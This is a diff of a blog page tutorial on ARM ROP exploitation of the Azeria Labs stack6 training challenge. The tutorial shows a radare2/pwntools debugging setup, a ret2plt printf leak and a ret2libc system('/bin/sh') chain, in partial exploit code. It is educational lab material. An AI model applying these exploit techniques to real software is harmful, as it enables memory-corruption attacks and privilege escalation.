@@ -89,7 +89,7 @@
 <script src="https://bananamafia.dev/js/bootstrap.min.js"></script>
 
 
-<script>$(document).on('click', function () { $('.collapse').collapse('hide'); })</script> <meta name="generator" content="Hugo 0.62.2" />
+<script>$(document).on('click', function () { $('.collapse').collapse('hide'); })</script> <meta name="generator" content="Hugo 0.64.0" />
         
 
         
@@ -181,20 +181,20 @@
 
 
     <br>
-    <div class="content-width text-justify"><p>Exploit development on ARM with <code>radare2</code> seems like a great idea until you start searching for resources, searching for a nice and automated debugging setup. Here's what I've found:</p>
+    <div class="content-width text-justify"><p>Exploit development on ARM with <code>radare2</code> seems like a great idea until you start searching for resources, searching for a nice and automated debugging setup. Here&rsquo;s what I&rsquo;ve found:</p>
 <p><marquee>nothing</marquee></p>
-<p>Cool. That's the reason why this post covers the setup I came up with, as well as basics for ROP on the ARM architecture. The exploit target is <code>stack6</code> from <a href="https://azeria-labs.com/part-3-stack-overflow-challenges/">Azeria Labs</a> and <code>radare2</code> will be used as a debugger. If you're a beginner I suggest reading the ARM assembly basics <a href="https://azeria-labs.com/writing-arm-assembly-part-1/">on the same site</a> first before starting the challenges from the beginning with <code>stack0</code>. The exploitation techniques covered in this post are ROP, ret2plt and ret2libc.</p>
+<p>Cool. That&rsquo;s the reason why this post covers the setup I came up with, as well as basics for ROP on the ARM architecture. The exploit target is <code>stack6</code> from <a href="https://azeria-labs.com/part-3-stack-overflow-challenges/">Azeria Labs</a> and <code>radare2</code> will be used as a debugger. If you&rsquo;re a beginner I suggest reading the ARM assembly basics <a href="https://azeria-labs.com/writing-arm-assembly-part-1/">on the same site</a> first before starting the challenges from the beginning with <code>stack0</code>. The exploitation techniques covered in this post are ROP, ret2plt and ret2libc.</p>
 <h1 id="emulation-vs-real-hardware">Emulation VS Real Hardware</h1>
 <p>Many people are using a QEMU-based virtual ARM machine for research and exploitation purposes. If you want to go this way, check out <a href="https://azeria-labs.com/emulate-raspberry-pi-with-qemu/">this guide</a>.</p>
-<p>However, I'm a fan of using real hardware. That's why I'm using a BananaPi (of course) with ARMbian. In order to use the debugging setup I came up with it doesn't really matter whether you're using real or emulated hardware though. It's just a matter of preference - the only requirements are having SSH access and <code>gdbserver</code> installed on the ARM machine.</p>
+<p>However, I&rsquo;m a fan of using real hardware. That&rsquo;s why I&rsquo;m using a BananaPi (of course) with ARMbian. In order to use the debugging setup I came up with it doesn&rsquo;t really matter whether you&rsquo;re using real or emulated hardware though. It&rsquo;s just a matter of preference - the only requirements are having SSH access and <code>gdbserver</code> installed on the ARM machine.</p>
 <h1 id="remote-debugging-with-radare2">Remote Debugging With <code>radare2</code></h1>
 <p>My setup is based on the fact that <code>radare2</code> is able to connect to a remote <code>gdbserver</code>, as described in the <a href="https://github.com/radareorg/radare2/blob/master/doc/gdb.md">documentation</a> and the <a href="https://radare.gitbooks.io/radare2book/debugger/remote_gdb.html">radare book</a>.</p>
 <p>On the remote machine, you would run <code>gdbserver :1337 ./stack6</code> and the following command on your machine to connect to it:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ r2 -e dbg.exe.path<span style="color:#f92672">=</span>&lt;local path to stack6&gt; -a arm -b <span style="color:#ae81ff">32</span> -d gdb://bananapi:1337
-</code></pre></div><p>This works pretty good for a first test but passing input to the debugee (yes, that word exists) dynamically is a pain and it's not really comfortable as it could be. Dynamically passing a second stage payload based on previous debugee output can be a requirement sometimes, as you will see shortly.</p>
+</code></pre></div><p>This works pretty good for a first test but passing input to the debugee (yes, that word exists) dynamically is a pain and it&rsquo;s not really comfortable as it could be. Dynamically passing a second stage payload based on previous debugee output can be a requirement sometimes, as you will see shortly.</p>
 <h1 id="adding-pwntools">Adding <code>pwntools</code></h1>
-<p>Luckily I've already created a wrapper around the exploitation library <a href="https://github.com/Gallopsled/pwntools">pwntools</a> that allows spawning <code>radare2</code> instead of <code>gdb</code> automatically. You can find it <a href="https://github.com/ps1337/pwntools-r2">here</a>. The only thing that has to be changed in order to make this work with remote ARM machines is the networking part.</p>
-<p>According to the <a href="http://docs.pwntools.com/en/stable/gdb.html">documentation</a>, the <code>gdb.debug()</code> function of <code>pwntools</code> already accepts an <code>ssh</code> parameter that performs remote debugging. Let's put it together:</p>
+<p>Luckily I&rsquo;ve already created a wrapper around the exploitation library <a href="https://github.com/Gallopsled/pwntools">pwntools</a> that allows spawning <code>radare2</code> instead of <code>gdb</code> automatically. You can find it <a href="https://github.com/ps1337/pwntools-r2">here</a>. The only thing that has to be changed in order to make this work with remote ARM machines is the networking part.</p>
+<p>According to the <a href="http://docs.pwntools.com/en/stable/gdb.html">documentation</a>, the <code>gdb.debug()</code> function of <code>pwntools</code> already accepts an <code>ssh</code> parameter that performs remote debugging. Let&rsquo;s put it together:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python2</span>
 
 <span style="color:#75715e"># Import pwntools</span>
@@ -227,10 +227,10 @@ p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74"></span
 
 <span style="color:#75715e"># Prevent from exiting</span>
 p<span style="color:#f92672">.</span>interactive()
-</code></pre></div><p><em>Note that I'm using</em> <code>dcu</code> <em>(debug continue until) instead of breakpoints since these didn't work for me out of the box.</em></p>
+</code></pre></div><p><em>Note that I&rsquo;m using</em> <code>dcu</code> <em>(debug continue until) instead of breakpoints since these didn&rsquo;t work for me out of the box.</em></p>
 <p>So you only have to check out the readme of my <code>pwntools-r2</code> module <a href="https://github.com/ps1337/pwntools-r2">here</a>, add the optional <code>ssh</code> parameter and the debugging setup is ready:</p>
 <p><img src="/img/rop-arm-1/rop-arm-1-demo.gif" alt="Demo"></p>
-<p>Here's what's happening in detail:</p>
+<p>Here&rsquo;s what&rsquo;s happening in detail:</p>
 <ol>
 <li>Login on the remote ARM machine</li>
 <li>Pull the binary to be exploited to the local machine</li>
@@ -242,7 +242,7 @@ p<span style="color:#f92672">.</span>interactive()
 <h1 id="building-the-exploit">Building the exploit</h1>
 <p>From this point on, all debugging commands are related to <code>radare2</code>.</p>
 <h2 id="checking-the-binary">Checking The Binary</h2>
-<p>Let's view the binary information first:</p>
+<p>Let&rsquo;s view the binary information first:</p>
 <pre><code class="language-console" data-lang="console">[0x000104d8]&gt; i
 [...]
 arch     arm
@@ -257,18 +257,18 @@ relro    no
 static   false
 stripped false
 [...]
-</code></pre><p>There's no stack canary, an executable stack and no PIC (Position Independent Code). Having PIC would prevent the exploit from using ret2plt, as I already described <a href="https://bananamafia.dev/post/binary-rop-stackpivot/">in a previous blog post</a>. The essence is that the GOT address of functions isn't static for PIC binaries since the whole binary is loaded at a random address in memory:</p>
+</code></pre><p>There&rsquo;s no stack canary, an executable stack and no PIC (Position Independent Code). Having PIC would prevent the exploit from using ret2plt, as I already described <a href="https://bananamafia.dev/post/binary-rop-stackpivot/">in a previous blog post</a>. The essence is that the GOT address of functions isn&rsquo;t static for PIC binaries since the whole binary is loaded at a random address in memory:</p>
 <p><em>Position independent functions accessing global data start by determining the absolute address of the GOT given their own current program counter value</em>  (from <a href="https://en.wikipedia.org/wiki/Position-independent_code">Wikipedia</a>)</p>
-<p>The goal for the <code>stack6</code> challenge is to spawn a (local) shell. Imagine it's a SUID binary and if you can cause the application to spawn a shell you've escalated privileges.</p>
+<p>The goal for the <code>stack6</code> challenge is to spawn a (local) shell. Imagine it&rsquo;s a SUID binary and if you can cause the application to spawn a shell you&rsquo;ve escalated privileges.</p>
 <p>The target asks for a path as input and prints it afterwards before exiting:</p>
 <pre><code class="language-console" data-lang="console">root@bananapi:~/ARM-challenges# ./stack6
 input path please: yolo
 got path yolo
 </code></pre><h2 id="getting-pc-control">Getting PC control</h2>
-<p>I often start off by sending a large pattern to the target. To create a pattern, <code>ragg2</code> that's bundled with <code>radare2</code> can be used:</p>
+<p>I often start off by sending a large pattern to the target. To create a pattern, <code>ragg2</code> that&rsquo;s bundled with <code>radare2</code> can be used:</p>
 <pre><code class="language-console" data-lang="console">$ ragg2 -r -P 150
 AAABAACAADAA[...]
-</code></pre><p>Let's integrate it into the debugging setup by changing the <code>p.sendline()</code> call and debug it:</p>
+</code></pre><p>Let&rsquo;s integrate it into the debugging setup by changing the <code>p.sendline()</code> call and debug it:</p>
 <ol>
 <li>The target executes <code>gets()</code> to read user input in a function called <code>getpath()</code></li>
 <li>At the end of <code>getpath()</code> <code>(0x0001054c)</code> it executes <code>pop {r4, fp, pc}</code> which loads the instruction pointer (<code>pc</code>) from the stack.</li>
@@ -284,12 +284,12 @@ Usage: wop[DO]   len @ addr | value
 80
 </code></pre><p>Therefore the correct offset to overwrite PC is 80.</p>
 <h2 id="utilizing-ret2plt-and-ret2libc">Utilizing ret2plt and ret2libc</h2>
-<p>The easiest way to spawn a shell in this scenario involves calling <code>system(&quot;/bin/sh&quot;)</code> using ret2libc. For this to work, the start address of libc has to be determined. Otherwise the correct addresses of both <code>system()</code> and the <code>/bin/sh</code> string can't be predicted because of ASLR.</p>
+<p>The easiest way to spawn a shell in this scenario involves calling <code>system(&quot;/bin/sh&quot;)</code> using ret2libc. For this to work, the start address of libc has to be determined. Otherwise the correct addresses of both <code>system()</code> and the <code>/bin/sh</code> string can&rsquo;t be predicted because of ASLR.</p>
 <p>With ret2plt it becomes possible to leak the address of a function at runtime without crashing the process. This means that the leaked information allows crafting a second stage payload that will spawn a shell in a second exploitation interaction.</p>
-<p>I've chosen to leak the address of <code>printf</code> because it's being used by the target itself. The target has to be forced to execute <code>printf@PLT(printf@GOT)</code> - this will then print and therefore leak the address of <code>printf</code> at runtime. The addresses of both <code>printf@PLT</code> and <code>printf@GOT</code> are fixed: Remember, no PIC?</p>
+<p>I&rsquo;ve chosen to leak the address of <code>printf</code> because it&rsquo;s being used by the target itself. The target has to be forced to execute <code>printf@PLT(printf@GOT)</code> - this will then print and therefore leak the address of <code>printf</code> at runtime. The addresses of both <code>printf@PLT</code> and <code>printf@GOT</code> are fixed: Remember, no PIC?</p>
 <p>Ok how to execute this call in this scenario? The <a href="https://static.docs.arm.com/ihi0042/g/aapcs32.pdf">calling convention</a> (from page 18) describes that the <code>r0</code>, <code>r1</code>, <code>r2</code> and <code>r3</code> registers are argument registers, while <code>r0</code> is the first argument. This means that in our scenario <code>r0</code> has to be populated accordingly while the other argument registers have to be zeroed. Since arguments are passed using registers, ROP has to be used to perform this call.</p>
 <h3 id="searching-for-rop-gadgets">Searching For ROP Gadgets</h3>
-<p>Let's search for fitting ROP gadgets. <code>radare2</code> can do this with <code>/R</code>:</p>
+<p>Let&rsquo;s search for fitting ROP gadgets. <code>radare2</code> can do this with <code>/R</code>:</p>
 <pre><code>[0x00010548]&gt; /R
 0x000105dc  f883bde8  pop {r3, r4, r5, r6, r7, r8, sb, pc}
 [...]
@@ -306,7 +306,7 @@ Usage: wop[DO]   len @ addr | value
 <li>The first one can be used to populate various registers, including the instruction pointer</li>
 <li>With the second one the remaining registers can be populated and <code>blx r3</code> also calls a function</li>
 </ol>
-<p><em>(The first gadget is present in the second one, I've listed it in there too for a better context)</em></p>
+<p><em>(The first gadget is present in the second one, I&rsquo;ve listed it in there too for a better context)</em></p>
 <h3 id="leaking-the-address">Leaking The Address</h3>
 <p>The approach is to chain these two gadgets to populate the registers accordingly. This allows calling <code>printf@PLT(printf@GOT)</code> and returning to the application entry point afterwards for a second exploitation stage.</p>
 <p>I came up with this ROP chain for the first stage:</p>
@@ -358,7 +358,7 @@ PRINTF_ADDR = u32(p.recv(4))
 print &quot;[*] Got addr: &quot; + str(hex(PRINTF_ADDR))
 </code></pre><p>After printing this, the application will return to its entry point (<code>ENTRY</code> value from above) to cause it to read another value from <code>stdin</code> for another round of exploitation. The value of the entry point address was determined with <code>ieq</code>.</p>
 <h3 id="calculating-addresses">Calculating Addresses</h3>
-<p>Now we know that <code>printf()</code> resides at a certain address. With knowledge of the libc version in use, it's now possible to calculate the start address of libc and therefore the address of every function that's present in there. For this calculation, some offsets have to be known first:</p>
+<p>Now we know that <code>printf()</code> resides at a certain address. With knowledge of the libc version in use, it&rsquo;s now possible to calculate the start address of libc and therefore the address of every function that&rsquo;s present in there. For this calculation, some offsets have to be known first:</p>
 <pre><code>$ nm -D /lib/arm-linux-gnueabihf/libc.so.6 | grep printf
 [...]
 00038204 T printf # printf offset
@@ -369,7 +369,7 @@ $ nm -D /lib/arm-linux-gnueabihf/libc.so.6 | grep system
 [...]
 $ strings -tx /lib/arm-linux-gnueabihf/libc.so.6 | grep &quot;/bin/sh&quot;
 d5f5c /bin/sh
-</code></pre><p>This could be done directly from <code>radare2</code>, but in remote debugging sessions this didn't work that good for me :)</p>
+</code></pre><p>This could be done directly from <code>radare2</code>, but in remote debugging sessions this didn&rsquo;t work that good for me :)</p>
 <p>With this information the required addresses can be calculated dynamically:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">LIBC_BASE <span style="color:#f92672">=</span> PRINTF_ADDR <span style="color:#f92672">-</span> PRINTF_OFFSET
 BINSH_ADDR <span style="color:#f92672">=</span> LIBC_BASE <span style="color:#f92672">+</span> BINSH_OFFSET
@@ -395,7 +395,7 @@ p<span style="color:#f92672">.</span>sendline(payload)
 
 <span style="color:#75715e"># Catch the shell</span>
 p<span style="color:#f92672">.</span>interactive()
-</code></pre></div><p>This is pretty straight forward If you've understood the previous ROP chain. This input overflows the buffer again and redirects the execution flow to the <code>POP</code> gadget. After populating all registers, <code>system(&quot;/bin/sh&quot;)</code> is getting called via the <code>blx r3</code> instruction in the <code>MOV_CALL</code> gadget:</p>
+</code></pre></div><p>This is pretty straight forward If you&rsquo;ve understood the previous ROP chain. This input overflows the buffer again and redirects the execution flow to the <code>POP</code> gadget. After populating all registers, <code>system(&quot;/bin/sh&quot;)</code> is getting called via the <code>blx r3</code> instruction in the <code>MOV_CALL</code> gadget:</p>
 <p><img src="/img/rop-arm-1/rop-arm-1-1.gif" alt="Shellz"></p>
 <center>
     <b>That's it!</b>
